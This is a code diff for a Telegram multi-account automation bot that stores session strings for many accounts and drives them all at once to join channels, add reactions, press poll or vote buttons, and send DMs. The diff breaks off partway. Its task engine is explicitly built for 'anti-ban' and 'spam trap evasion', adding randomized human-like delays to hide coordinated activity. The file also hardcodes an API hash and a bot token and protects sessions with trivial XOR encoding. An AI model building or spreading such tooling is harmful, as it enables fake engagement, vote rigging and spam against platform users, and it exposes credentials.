@@ -1,11 +1,13 @@
 import asyncio
-import os
-import sys
+import base64
 import json
 import logging
-import random
-import aiosqlite
+import os
+import re
+import sys
+from typing import Dict, Any, List, Optional, Tuple
 
+# aiogram 3.x imports
 from aiogram import Bot, Dispatcher, Router, F
 from aiogram.filters import Command, StateFilter
 from aiogram.fsm.context import FSMContext
@@ -19,45 +21,354 @@ from aiogram.types import (
     BufferedInputFile
 )
 
-from telethon import TelegramClient
-from telethon.sessions import StringSession, SQLiteSession
+# Telethon imports
+from telethon import TelegramClient, functions, types as tg_types
+from telethon.sessions import StringSession
 from telethon.errors import (
     SessionPasswordNeededError,
     PhoneCodeInvalidError,
-    PasswordHashInvalidError,
-    AuthKeyUnregisteredError
+    PasswordHashInvalidError
 )
-# Telethon specific imports for joining channels and reactions
-from telethon.tl.functions.messages import ImportChatInviteRequest, SendReactionRequest
-from telethon.tl.functions.channels import JoinChannelRequest
-from telethon.tl.types import ReactionEmoji, ReplyInlineMarkup
 
-# Modular imports
-from config import API_ID, API_HASH, BOT_TOKEN, SUPER_OWNER_IDS
-from database import db_mgr
-from helpers import (
-    registration_sessions,
-    encrypt_data,
-    decrypt_data,
-    parse_telegram_link,
-    SecurityHubLogger
-)
-from tasks import task_queue
+# SQLite
+import aiosqlite
 
-# --- LOGGING SETUP ---
+# --- CONFIGURATION ---
+API_ID = int(os.getenv("TG_API_ID", "30636134"))
+API_HASH = os.getenv("TG_API_HASH", "9c5bb2bbeb19a0da5bfb0e7052875d2f")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8733721396:AAHJrr4uHC2WEx5r6BCHqBmx4LbMKh1Ngds")
+
+# HARDCODED MULTI-SUPER-OWNER MATRIX
+SUPER_OWNER_IDS = [7952327997, 7953147643, 8064493735] 
+
+SECRET_KEY = os.getenv("ENCRYPTION_KEY", "pydroid_secure_fallback_key_2026")
+
+# --- LOGGING ---
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
     handlers=[logging.StreamHandler(sys.stdout)]
 )
-logger = logging.getLogger("MultiAccountSystem.Main")
+logger = logging.getLogger("MultiAccountSystem")
+
+# --- CRYPTO HELPERS ---
+def _get_crypto_key() -> int:
+    return sum(ord(c) for c in SECRET_KEY) % 256 or 42
+
+def encrypt_data(data: str) -> str:
+    key = _get_crypto_key()
+    cipher_bytes = bytes([b ^ key for b in data.encode('utf-8')])
+    return base64.b64encode(cipher_bytes).decode('utf-8')
+
+def decrypt_data(encrypted_data: str) -> str:
+    key = _get_crypto_key()
+    try:
+        raw_cipher = base64.b64decode(encrypted_data.encode('utf-8'))
+        plain_bytes = bytes([b ^ key for b in raw_cipher])
+        return plain_bytes.decode('utf-8')
+    except Exception as e:
+        logger.error(f"Decryption failure: {e}")
+        return ""
+
+# --- LINK PARSING HELPER ---
+def parse_telegram_link(link: str) -> Tuple[Any, Optional[int], bool]:
+    """
+    Parses various telegram link structures.
+    Returns: (parsed_target, msg_id, is_private_hash)
+    """
+    link = link.strip().replace(" ", "")
+    if not link:
+        return None, None, False
+        
+    # Check for private join hash formats first
+    # Matches: t.me/joinchat/XXXX, t.me/+XXXX, joinchat/XXXX, or just +XXXX
+    hash_match = re.search(r'(?:joinchat/|\+|t\.me/\+)([a-zA-Z0-9_\-]+)', link)
+    if hash_match:
+        return hash_match.group(1), None, True
+
+    # Matches private channel post links: t.me/c/12345678/90
+    private_match = re.search(r't\.me/c/(\d+)/(\d+)', link)
+    if private_match:
+        channel_id = int(f"-100{private_match.group(1)}")
+        msg_id = int(private_match.group(2))
+        return channel_id, msg_id, False
+        
+    # Matches public post links: t.me/username/90
+    msg_match = re.search(r't\.me/([^/]+)/(\d+)', link)
+    if msg_match:
+        return msg_match.group(1), int(msg_match.group(2)), False
+        
+    # Matches raw clean username formats
+    target = link.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
+    if "/" in target:
+        parts = target.split("/")
+        target = parts[0]
+        if len(parts) > 1 and parts[1].isdigit():
+            msg_id = int(parts[1])
+            return target, msg_id, False
+            
+    return target, None, False
+
+# --- DATABASE ENGINE ---
+class Database:
+    def __init__(self, db_path: str = "bot_core_data.db"):
+        self.db_path = db_path
+
+    async def init(self):
+        async with aiosqlite.connect(self.db_path) as db:
+            await db.execute("""
+                CREATE TABLE IF NOT EXISTS users (
+                    user_id INTEGER PRIMARY KEY,
+                    username TEXT,
+                    role TEXT DEFAULT 'user', 
+                    max_accounts INTEGER DEFAULT 5,
+                    referred_by INTEGER,
+                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                )
+            """)
+            await db.execute("""
+                CREATE TABLE IF NOT EXISTS accounts (
+                    phone TEXT PRIMARY KEY,
+                    user_id INTEGER, 
+                    username TEXT,
+                    session_string TEXT,
+                    status TEXT DEFAULT 'active', 
+                    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    FOREIGN KEY(user_id) REFERENCES users(user_id)
+                )
+            """)
+            await db.execute("""
+                CREATE TABLE IF NOT EXISTS tasks (
+                    task_id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    creator_id INTEGER,
+                    type TEXT, 
+                    payload TEXT, 
+                    status TEXT DEFAULT 'pending', 
+                    progress TEXT DEFAULT '0%',
+                    success_report TEXT,
+                    failure_report TEXT,
+                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                )
+            """)
+            await db.execute("""
+                CREATE TABLE IF NOT EXISTS logs (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    user_id INTEGER,
+                    action TEXT,
+                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                )
+            """)
+            await db.commit()
+            logger.info("Database system initialized.")
+
+    async def log_action(self, user_id: int, action: str):
+        async with aiosqlite.connect(self.db_path) as db:
+            await db.execute("INSERT INTO logs (user_id, action) VALUES (?, ?)", (user_id, action))
+            await db.commit()
+
+    async def get_user_role(self, user_id: int) -> str:
+        if user_id in SUPER_OWNER_IDS:
+            return "super_owner"
+        async with aiosqlite.connect(self.db_path) as db:
+            async with db.execute("SELECT role FROM users WHERE user_id = ?", (user_id,)) as cursor:
+                row = await cursor.fetchone()
+                return row[0] if row else "user"
+
+    async def get_admin_limits(self, user_id: int) -> int:
+        async with aiosqlite.connect(self.db_path) as db:
+            async with db.execute("SELECT max_accounts FROM users WHERE user_id = ?", (user_id,)) as cursor:
+                row = await cursor.fetchone()
+                return row[0] if row else 5
+
+    async def create_user_if_not_exists(self, user_id: int, username: str, referred_by: Optional[int] = None):
+        async with aiosqlite.connect(self.db_path) as db:
+            async with db.execute("SELECT 1 FROM users WHERE user_id = ?", (user_id,)) as cursor:
+                if not await cursor.fetchone():
+                    await db.execute(
+                        "INSERT INTO users (user_id, username, role, referred_by) VALUES (?, ?, 'user', ?)",
+                        (user_id, username, referred_by)
+                    )
+                    await db.commit()
+
+db_mgr = Database()
+registration_sessions: Dict[int, Dict[str, Any]] = {}
+
+# --- ANTI-BAN TASK MANAGER ENGINE ---
+class TaskQueue:
+    def __init__(self):
+        self.queue = asyncio.Queue()
+        self.current_tasks: Dict[int, asyncio.Task] = {}
+
+    async def add_task(self, task_id: int, creator_id: int, task_type: str, payload: dict):
+        await self.queue.put((task_id, creator_id, task_type, payload))
+
+    async def start_worker(self):
+        logger.info("Anti-Ban Task pipeline processing loop started.")
+        while True:
+            task_id, creator_id, task_type, payload = await self.queue.get()
+            loop_task = asyncio.create_task(self.execute_task(task_id, creator_id, task_type, payload))
+            self.current_tasks[task_id] = loop_task
+            try:
+                await loop_task
+            except Exception as e:
+                logger.error(f"Execution failure on task #{task_id}: {e}")
+            finally:
+                self.current_tasks.pop(task_id, None)
+                self.queue.task_done()
+
+    async def execute_task(self, task_id: int, creator_id: int, task_type: str, payload: dict):
+        import random
+        from telethon.errors import FloodWaitError
+
+        async with aiosqlite.connect(db_mgr.db_path) as db:
+            await db.execute("UPDATE tasks SET status = 'running', progress = '0%' WHERE task_id = ?", (task_id,))
+            await db.commit()
+
+        role = await db_mgr.get_user_role(creator_id)
+        clients_data = []
+        
+        async with aiosqlite.connect(db_mgr.db_path) as db:
+            if role in ["admin", "owner", "super_owner"]:
+                query = "SELECT phone, session_string FROM accounts WHERE status = 'active'"
+                cursor = await db.execute(query)
+            else:
+                query = "SELECT phone, session_string FROM accounts WHERE status = 'active' AND user_id = ?"
+                cursor = await db.execute(query, (creator_id,))
+            
+            async for row in cursor:
+                clients_data.append((row[0], decrypt_data(row[1])))
+
+        if not clients_data:
+            async with aiosqlite.connect(db_mgr.db_path) as db:
+                await db.execute("UPDATE tasks SET status = 'failed', progress = '0 active bridges available' WHERE task_id = ?", (task_id,))
+                await db.commit()
+            return
+
+        passed_ids: List[str] = []
+        failed_ids: List[Tuple[str, str]] = []
+        total_accounts = len(clients_data)
+
+        # --- TELEGRAM SPAM TRAP EVASION CONFIGURATION ---
+        BATCH_SIZE = 5               
+        BASE_COOLDOWN = 15           
+
+        for index, (phone, enc_session) in enumerate(clients_data):
+            client = TelegramClient(StringSession(enc_session), API_ID, API_HASH)
+            try:
+                # 1. Human Simulation: Add a small staggered startup delay before connecting
+                await asyncio.sleep(random.uniform(1.0, 3.0))
+                
+                await client.connect()
+                if not await client.is_user_authorized():
+                    async with aiosqlite.connect(db_mgr.db_path) as db_conn:
+                        await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
+                        await db_conn.commit()
+                    failed_ids.append((phone, "Unauthorized/Session Expired"))
+                    continue
+
+                target = payload.get("target", "")
+                parsed_target, link_msg_id, is_private_hash = parse_telegram_link(target)
+                msg_id = int(payload.get("msg_id", link_msg_id or 0))
+
+                # 2. Human Simulation: Add a realistic read delay before interacting
+                await asyncio.sleep(random.uniform(2.5, 5.0))
+
+                # --- OPERATION ROUTER ---
+                if task_type == "join":
+                    if is_private_hash:
+                        # Clean call using exact invite hash
+                        await client(functions.messages.ImportChatInviteRequest(hash=parsed_target))
+                    else:
+                        await client(functions.channels.JoinChannelRequest(channel=parsed_target))
+                        
+                elif task_type == "leave":
+                    # Leave can work on both public username and private parsed target ID
+                    await client(functions.channels.LeaveChannelRequest(channel=parsed_target))
+                    
+                elif task_type == "react":
+                    emojis = payload.get("reactions", ["👍"])
+                    assigned_emoji = emojis[index % len(emojis)]
+                    await client(functions.messages.SendReactionRequest(
+                        peer=parsed_target,
+                        msg_id=msg_id,
+                        reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
+                    ))
+                        
+                elif task_type == "button_vote":
+                    button_text = payload.get("button_text", "").strip().lower()
+                    msg = await client.get_messages(parsed_target, ids=msg_id)
+                    if msg and msg.reply_markup:
+                        target_button = None
+                        for r_idx, row in enumerate(msg.reply_markup.rows):
+                            for c_idx, btn in enumerate(row.buttons):
+                                if button_text in btn.text.strip().lower():
+                                    target_button = btn
+                                    break
+                            if target_button:
+                                break
+                                
+                        if target_button and isinstance(target_button, tg_types.KeyboardButtonCallback):
+                            await client(functions.messages.GetBotCallbackAnswerRequest(
+                                peer=parsed_target,
+                                msg_id=msg_id,
+                                data=target_button.data
+                            ))
+                        else:
+                            raise ValueError(f"No callback button containing '{button_text}' was found.")
+                    else:
+                        raise ValueError("No inline layout keyboard signature found on the message node.")
+                        
+                elif task_type == "dm":
+                    message_text = payload.get("text", "Hello!")
+                    await client.send_message(parsed_target, message_text)
+
+                passed_ids.append(phone)
+                
+            except FloodWaitError as fwe:
+                wait_time = fwe.seconds
+                logger.warning(f"⚠️ Account +{phone} hit a FloodWait! Action requires {wait_time}s cooldown.")
+                failed_ids.append((phone, f"FloodWaitError: Blocked for {wait_time}s"))
+                backoff = min(wait_time, 30)
+                await asyncio.sleep(backoff)
+                
+            except Exception as e:
+                logger.warning(f"Bridge +{phone} skipped task #{task_id}: {e}")
+                failed_ids.append((phone, str(e)))
+            finally:
+                await client.disconnect()
+
+            # --- DYNAMIC BATCH AND STEP COOLDOWNS ---
+            if (index + 1) % BATCH_SIZE == 0 and (index + 1) < total_accounts:
+                batch_cooldown = BASE_COOLDOWN + random.randint(5, 15)
+                logger.info(f"⚡ Batch threshold met ({index + 1}/{total_accounts}). Halting execution for {batch_cooldown} seconds...")
+                await asyncio.sleep(batch_cooldown)
+            else:
+                micro_delay = random.uniform(3.0, 6.5)
+                await asyncio.sleep(micro_delay)
+
+            progress_pct = f"{int(((index + 1) / total_accounts) * 100)}%"
+            async with aiosqlite.connect(db_mgr.db_path) as db:
+                await db.execute("UPDATE tasks SET progress = ? WHERE task_id = ?", (progress_pct, task_id))
+                await db.commit()
+
+        status = "completed" if len(passed_ids) > 0 else "failed"
+        success_report_json = json.dumps(passed_ids)
+        failure_report_json = json.dumps(failed_ids)
+
+        async with aiosqlite.connect(db_mgr.db_path) as db:
+            await db.execute(
+                "UPDATE tasks SET status = ?, progress = ?, success_report = ?, failure_report = ? WHERE task_id = ?",
+                (status, f"{len(passed_ids)}/{total_accounts} Passed", success_report_json, failure_report_json, task_id)
+            )
+            await db.commit()
+
+task_queue = TaskQueue()
 
 # --- FSM STATES ---
 class RegistrationStates(StatesGroup):
     waiting_for_phone = State()
     waiting_for_otp = State()
     waiting_for_2fa = State()
-    waiting_for_session_file = State()
 
 class TaskWizardStates(StatesGroup):
     choosing_type = State()
@@ -66,10 +377,10 @@ class TaskWizardStates(StatesGroup):
     waiting_for_button_text = State()
     waiting_for_dm_text = State()
 
+# --- UI KEYBOARD GENERATORS ---
 REACTION_EMOJIS = ["👍", "👎", "🔥", "🎉", "👏", "🥰", "😮", "😢", "😡", "💩", "🤩", "🤔", "👀", "💯", "🤣"]
 
-# --- KEYBOARD BUILDERS ---
-def get_emoji_selection_keyboard(selected_emojis: list) -> InlineKeyboardMarkup:
+def get_emoji_selection_keyboard(selected_emojis: List[str]) -> InlineKeyboardMarkup:
     keyboard = []
     row = []
     for emoji in REACTION_EMOJIS:
@@ -82,75 +393,37 @@ def get_emoji_selection_keyboard(selected_emojis: list) -> InlineKeyboardMarkup:
     if row:
         keyboard.append(row)
     
-    keyboard.append([InlineKeyboardButton(text="🎲 Random Match Existing", callback_data="toggle_emoji:random_match")])
-    keyboard.append([InlineKeyboardButton(text="✨ Confirm Reaction", callback_data="finish_emoji_selection")])
-    keyboard.append([InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")])
+    keyboard.append([InlineKeyboardButton(text="✅ Done Select Emojis", callback_data="finish_emoji_selection")])
+    keyboard.append([InlineKeyboardButton(text="🔙 Back to Main Console", callback_data="main_menu")])
     return InlineKeyboardMarkup(inline_keyboard=keyboard)
 
 def get_main_keyboard(role: str) -> InlineKeyboardMarkup:
     buttons = [
-        [InlineKeyboardButton(text="📱 Manage Linked Accounts", callback_data="manage_accounts")],
-        [InlineKeyboardButton(text="🚀 Start New Task", callback_data="task_hub_start")],
-        [InlineKeyboardButton(text="📊 View Tasks History", callback_data="view_tasks")],
-        [InlineKeyboardButton(text="👥 My Referrals", callback_data="view_referrals")]
+        [InlineKeyboardButton(text="📱 Manage Client Infrastructure", callback_data="manage_accounts")],
+        [InlineKeyboardButton(text="⚡ Setup Automation Task", callback_data="task_hub_start")],
+        [InlineKeyboardButton(text="📊 Operational Pipeline Logs", callback_data="view_tasks")],
+        [InlineKeyboardButton(text="👥 My Referral Matrix", callback_data="view_referrals")]
     ]
     if role in ["admin", "owner", "super_owner"]:
-        buttons.append([InlineKeyboardButton(text="🛠️ Admin Control Panel", callback_data="admin_panel")])
+        buttons.append([InlineKeyboardButton(text="🛠️ Administrative Control Console", callback_data="admin_panel")])
     if role in ["owner", "super_owner"]:
         buttons.append([InlineKeyboardButton(text="💾 Database Core Backups", callback_data="backup_panel")])
-        buttons.append([InlineKeyboardButton(text="📈 System Stats", callback_data="system_stats")])
+        buttons.append([InlineKeyboardButton(text="📈 System Performance Analytics", callback_data="system_stats")])
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
 def get_task_types_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📥 Join Channel", callback_data="set_type:join")],
-        [InlineKeyboardButton(text="📤 Leave Channel", callback_data="set_type:leave")],
-        [InlineKeyboardButton(text="🎭 Add Reactions", callback_data="set_type:react")],
-        [InlineKeyboardButton(text="🔘 Click Inline Button", callback_data="set_type:button_vote")],
-        [InlineKeyboardButton(text="📝 Send Direct Message (DM)", callback_data="set_type:dm")],
-        [InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")]
+        [InlineKeyboardButton(text="📢 Join Channel (Pub/Priv)", callback_data="set_type:join")],
+        [InlineKeyboardButton(text="💨 Leave Channel", callback_data="set_type:leave")],
+        [InlineKeyboardButton(text="🎭 Add Reaction Expression", callback_data="set_type:react")],
+        [InlineKeyboardButton(text="🔘 Press Inline Markup Button", callback_data="set_type:button_vote")],
+        [InlineKeyboardButton(text="✉️ Send Direct Message (DM)", callback_data="set_type:dm")],
+        [InlineKeyboardButton(text="🔙 Back to Main Console", callback_data="main_menu")]
     ])
 
+# --- COMMAND ROUTING HANDLERS ---
 router = Router()
 
-# --- TARGET PARSER & AUTOMATION IMPLEMENTATION ---
-async def join_channel_helper(client: TelegramClient, target: str):
-    """
-    Tries joining a public channel or a private channel/chat via invitation link.
-    """
-    clean_target = target.strip()
-    # Check if target is a link
-    if "t.me/" in clean_target or "telegram.dog/" in clean_target:
-        # Extract join hash from private links: t.me/joinchat/hash or t.me/+hash
-        if "/joinchat/" in clean_target or "t.me/+" in clean_target:
-            invite_hash = clean_target.split("/")[-1].replace("+", "").strip()
-            return await client(ImportChatInviteRequest(invite_hash))
-            
-    # Fallback to public channel join
-    return await client(JoinChannelRequest(clean_target))
-
-async def click_inline_button_helper(client: TelegramClient, entity, msg_id: int, button_text: str):
-    """
-    Retrieves the message, scans the inline keyboard elements, and clicks the matching button.
-    """
-    messages = await client.get_messages(entity, ids=[msg_id])
-    if not messages or not messages[0]:
-        raise ValueError("Message not found.")
-        
-    message = messages[0]
-    if not message.reply_markup or not isinstance(message.reply_markup, ReplyInlineMarkup):
-        raise ValueError("This message contains no inline buttons.")
-
-    for row in message.reply_markup.rows:
-        for button in row.buttons:
-            if button_text.strip().lower() in button.text.strip().lower():
-                # Click the match button
-                await message.click(button)
-                return True
-                
-    raise ValueError(f"Button with text '{button_text}' was not found.")
-
-# --- HANDLERS ---
 @router.message(Command("start"))
 async def cmd_start(message: Message, state: FSMContext):
     await state.clear()
@@ -169,10 +442,10 @@ async def cmd_start(message: Message, state: FSMContext):
     role = await db_mgr.get_user_role(user_id)
 
     welcome_text = (
-        f"👋 Welcome to the Multi-Account Automation System!\n\n"
-        f"🆔 Account ID: {user_id}\n"
-        f"⚡ System Privilege Level: {role.upper()}\n\n"
-        "Manage, connect, and deploy multiple Telegram accounts safely from one screen."
+        f"👋 Welcome to the **Multi-Account Automation Framework**!\n\n"
+        f"👤 **Account ID:** `{user_id}`\n"
+        f"🛡️ **System Privilege Level:** `{role.upper()}`\n\n"
+        "Deploy, coordinate, and monitor distributed infrastructure tasks safely."
     )
     await message.answer(welcome_text, reply_markup=get_main_keyboard(role))
 
@@ -181,141 +454,21 @@ async def handle_main_menu(callback: CallbackQuery, state: FSMContext):
     await state.clear()
     role = await db_mgr.get_user_role(callback.from_user.id)
     await callback.message.edit_text(
-        "🎛️ Main Control Panel\nChoose an action below to get started:",
+        "👋 **Main Control Console**\nSelect an action vector below:",
         reply_markup=get_main_keyboard(role)
     )
 
-# --- GET SESSION FILE ---
-@router.message(Command("getsession"))
-async def cmd_get_session(message: Message):
-    user_id = message.from_user.id
-    role = await db_mgr.get_user_role(user_id)
-    
-    args = message.text.split()
-    if len(args) < 2:
-        await message.answer("ℹ️ Usage:\n/getsession <phone_number_without_plus>\n\nExample:\n/getsession 1234567890")
-        return
-        
-    target_phone = args[1].replace("+", "").strip()
-
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        async with db.execute("SELECT user_id, username, session_string FROM accounts WHERE phone = ?", (target_phone,)) as cursor:
-            row = await cursor.fetchone()
-            
-    if not row:
-        await message.answer("❌ This phone number is not registered in the system database.")
-        return
-        
-    account_owner_id, account_username, enc_session = row
-    
-    if role not in ["admin", "owner", "super_owner"] and account_owner_id != user_id:
-        await message.answer("🚫 Permission Denied: You cannot access this session file.")
-        return
-
-    progress_msg = await message.answer("⏳ Regenerating physical SQLite session structure...")
-    
-    decrypted_session_str = decrypt_data(enc_session)
-    if not decrypted_session_str:
-        await progress_msg.edit_text("❌ Failed to decrypt session string data.")
-        return
-
-    export_filename = f"export_{target_phone}_{random.randint(1000, 9999)}"
-    export_full_path = f"{export_filename}.session"
-
-    try:
-        temp_session = SQLiteSession(export_filename)
-        parsed_string_session = StringSession(decrypted_session_str)
-        
-        temp_session.set_dc(
-            parsed_string_session.dc_id,
-            parsed_string_session.server_address,
-            parsed_string_session.port
-        )
-        temp_session.auth_key = parsed_string_session.auth_key
-        temp_session.save()
-        temp_session.close() 
-        
-        await asyncio.sleep(0.5)
-
-        if not os.path.exists(export_full_path):
-            raise FileNotFoundError("Could not finalize export compilation structure on runtime storage.")
-
-        with open(export_full_path, "rb") as f:
-            session_bytes = f.read()
-
-        session_file_payload = BufferedInputFile(session_bytes, filename=f"+{target_phone}.session")
-        
-        caption_text = (
-            f"🔑 Physical Telegram Session File Extracted\n"
-            f"📱 Phone: +{target_phone}\n"
-            f"👤 Username: @{account_username or 'N/A'}\n"
-            f"⚙️ Format: Standard Telethon SQLite Binary (.session)"
-        )
-        
-        await message.reply_document(document=session_file_payload, caption=caption_text)
-        await progress_msg.delete()
-
-    except Exception as e:
-        logger.error(f"Error compiling session file for extraction: {e}")
-        await progress_msg.edit_text(f"❌ System failure extracting database file: {str(e)}")
-    finally:
-        if os.path.exists(export_full_path):
-            try:
-                os.remove(export_full_path)
-            except Exception:
-                pass
-
-# --- CANCEL TASK ---
-@router.message(Command("canceltask"))
-async def cmd_cancel_task(message: Message):
-    user_id = message.from_user.id
-    role = await db_mgr.get_user_role(user_id)
-    
-    args = message.text.split()
-    if len(args) < 2 or not args[1].isdigit():
-        await message.answer("ℹ️ Usage:\n/canceltask <task_id>")
-        return
-        
-    task_id = int(args[1])
-    
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        async with db.execute("SELECT creator_id, status FROM tasks WHERE task_id = ?", (task_id,)) as cursor:
-            row = await cursor.fetchone()
-            
-    if not row:
-        await message.answer("❌ Task not found in database.")
-        return
-        
-    creator_id, status = row
-    
-    if role not in ["admin", "owner", "super_owner"] and creator_id != user_id:
-        await message.answer("🚫 Permission Denied: You cannot cancel this task.")
-        return
-        
-    if status in ["completed", "failed", "cancelled"]:
-        await message.answer(f"ℹ️ Task {task_id} has already finished with status: {status.upper()}")
-        return
-        
-    was_active_or_pending = await task_queue.cancel_specific_task(task_id)
-    
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        await db.execute("UPDATE tasks SET status = 'cancelled', progress = 'Stopped by user request' WHERE task_id = ?", (task_id,))
-        await db.commit()
-        
-    await db_mgr.log_action(user_id, f"Cancelled task {task_id}")
-    await message.answer(f"🛑 Task {task_id} successfully cancelled. Processing updates have terminated.")
-
-# --- ADMIN PANEL & COMMANDS ---
+# --- ADMINISTRATIVE ROLES ASSIGNMENT SYSTEM ---
 @router.message(Command("addadmin"))
 async def cmd_add_admin(message: Message):
     role = await db_mgr.get_user_role(message.from_user.id)
     if role not in ["owner", "super_owner"]:
-        await message.answer("🚫 Access Denied.")
+        await message.answer("🚫 Access Denied: Insufficient authorization profiles.")
         return
 
     args = message.text.split()
     if len(args) < 3 or not args[1].isdigit() or not args[2].isdigit():
-        await message.answer("ℹ️ Usage:\n/addadmin <target_user_id> <max_account_limit>\n\nExample:\n/addadmin 987654321 50")
+        await message.answer("ℹ️ **Usage:** `/addadmin <target_user_id> <max_account_limit>`\nExample: `/addadmin 987654321 50`")
         return
 
     target_id, limit = int(args[1]), int(args[2])
@@ -327,8 +480,8 @@ async def cmd_add_admin(message: Message):
                 await db.execute("UPDATE users SET role = 'admin', max_accounts = ? WHERE user_id = ?", (limit, target_id))
         await db.commit()
 
-    await db_mgr.log_action(message.from_user.id, f"Promoted user {target_id} to Admin with limit {limit}")
-    await message.answer(f"✅ Success! User {target_id} is now registered as an Admin with access limit set to {limit} accounts.")
+    await db_mgr.log_action(message.from_user.id, f"Promoted user {target_id} to Admin with account limit {limit}")
+    await message.answer(f"✅ Success! User ID `{target_id}` is now registered as an **Admin** with access limits set to `{limit}` automated IDs.")
 
 @router.message(Command("removeadmin"))
 async def cmd_remove_admin(message: Message):
@@ -339,13 +492,13 @@ async def cmd_remove_admin(message: Message):
 
     args = message.text.split()
     if len(args) < 2 or not args[1].isdigit():
-        await message.answer("ℹ️ Usage:\n/removeadmin <target_user_id>")
+        await message.answer("ℹ️ **Usage:** `/removeadmin <target_user_id>`")
         return
 
     target_id = int(args[1])
     target_role = await db_mgr.get_user_role(target_id)
     if target_role == "super_owner":
-        await message.answer("❌ Security Error: Super Owners cannot be demoted.")
+        await message.answer("❌ Security Violation: Super Owners cannot be demoted.")
         return
 
     async with aiosqlite.connect(db_mgr.db_path) as db:
@@ -353,115 +506,9 @@ async def cmd_remove_admin(message: Message):
         await db.commit()
 
     await db_mgr.log_action(message.from_user.id, f"Demoted Admin {target_id}")
-    await message.answer(f"✅ User {target_id} has been demoted back to a regular user.")
+    await message.answer(f"✅ User ID `{target_id}` has been stripped of Admin access privileges.")
 
-@router.message(Command("deleteaccount"))
-async def cmd_delete_account(message: Message):
-    user_id = message.from_user.id
-    role = await db_mgr.get_user_role(user_id)
-    
-    args = message.text.split()
-    if len(args) < 2:
-        await message.answer("ℹ️ Usage:\n/deleteaccount <phone_number_without_plus>\n\nExample:\n/deleteaccount 1234567890")
-        return
-        
-    target_phone = args[1].replace("+", "").strip()
-
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        async with db.execute("SELECT user_id FROM accounts WHERE phone = ?", (target_phone,)) as cursor:
-            row = await cursor.fetchone()
-            
-    if not row:
-        await message.answer("❌ This account is not registered in the system.")
-        return
-        
-    account_owner_id = row[0]
-    
-    is_allowed = False
-    if role in ["owner", "super_owner"] or account_owner_id == user_id:
-        is_allowed = True
-    elif role == "admin":
-        async with aiosqlite.connect(db_mgr.db_path) as db:
-            async with db.execute("SELECT role, referred_by FROM users WHERE user_id = ?", (account_owner_id,)) as cursor:
-                u_row = await cursor.fetchone()
-                if u_row:
-                    u_role, referred_by = u_row
-                    if u_role == "user" or referred_by == user_id:
-                        is_allowed = True
-
-    if not is_allowed:
-        await message.answer("🚫 Permission Denied: You cannot delete this account.")
-        return
-
-    for filename in [f"session_{target_phone}.session", f"+{target_phone}.session"]:
-        if os.path.exists(filename):
-            try:
-                os.remove(filename)
-            except Exception:
-                pass
-
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        await db.execute("DELETE FROM accounts WHERE phone = ?", (target_phone,))
-        await db.commit()
-
-    await db_mgr.log_action(user_id, f"Deleted account session +{target_phone}")
-    await message.answer(f"🗑️ Permanent deletion complete. The session for +{target_phone} has been wiped.")
-
-@router.message(Command("deleteuser"))
-async def cmd_delete_user(message: Message):
-    user_id = message.from_user.id
-    role = await db_mgr.get_user_role(user_id)
-    
-    args = message.text.split()
-    if len(args) < 2 or not args[1].isdigit():
-        await message.answer("ℹ️ Usage:\n/deleteuser <user_id_to_wipe>\n\nExample:\n/deleteuser 7952327997")
-        return
-        
-    target_user_id = int(args[1])
-    
-    if target_user_id in SUPER_OWNER_IDS:
-        await message.answer("❌ Security Error: Super Owners cannot be deleted from the database.")
-        return
-
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        async with db.execute("SELECT role, referred_by FROM users WHERE user_id = ?", (target_user_id,)) as cursor:
-            row = await cursor.fetchone()
-            
-    if not row:
-        await message.answer("❌ This user profile is not registered in the system.")
-        return
-        
-    target_role, referred_by = row
-    
-    is_allowed = False
-    if role in ["owner", "super_owner"]:
-        is_allowed = True
-    elif role == "admin" and referred_by == user_id:
-        is_allowed = True
-
-    if not is_allowed:
-        await message.answer("🚫 Permission Denied: You cannot delete this user.")
-        return
-
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        async with db.execute("SELECT phone FROM accounts WHERE user_id = ?", (target_user_id,)) as cursor:
-            async for acct_row in cursor:
-                phone = acct_row[0]
-                for filename in [f"session_{phone}.session", f"+{phone}.session"]:
-                    if os.path.exists(filename):
-                        try:
-                            os.remove(filename)
-                        except Exception:
-                            pass
-                            
-        await db.execute("DELETE FROM accounts WHERE user_id = ?", (target_user_id,))
-        await db.execute("DELETE FROM users WHERE user_id = ?", (target_user_id,))
-        await db.commit()
-
-    await db_mgr.log_action(user_id, f"Deleted user ID {target_user_id} and all related accounts")
-    await message.answer(f"🗑️ Wiped profile {target_user_id} and all associated Telegram sessions successfully.")
-
-# --- ACCOUNT CONTROL HANDLERS ---
+# --- ACCOUNT INFRASTRUCTURE DEPLOYMENT ---
 @router.callback_query(F.data == "manage_accounts")
 async def list_user_accounts(callback: CallbackQuery):
     user_id = callback.from_user.id
@@ -474,192 +521,45 @@ async def list_user_accounts(callback: CallbackQuery):
             cursor = await db.execute("SELECT phone, status, username FROM accounts WHERE user_id = ?", (user_id,))
         rows = await cursor.fetchall()
 
-    text = "📱 Linked Telegram Accounts\n\n"
+    text = "📱 **Operational Channels Infrastructure**\n\n"
     if not rows:
-        text += "No accounts linked yet."
+        text += "_No automation profiles currently linked._"
     else:
         for row in rows:
             icon = "🟢" if row[1] == "active" else "🔴"
-            text += f"{icon} +{row[0]} (@{row[2] or 'N/A'}) - {row[1].upper()}\n"
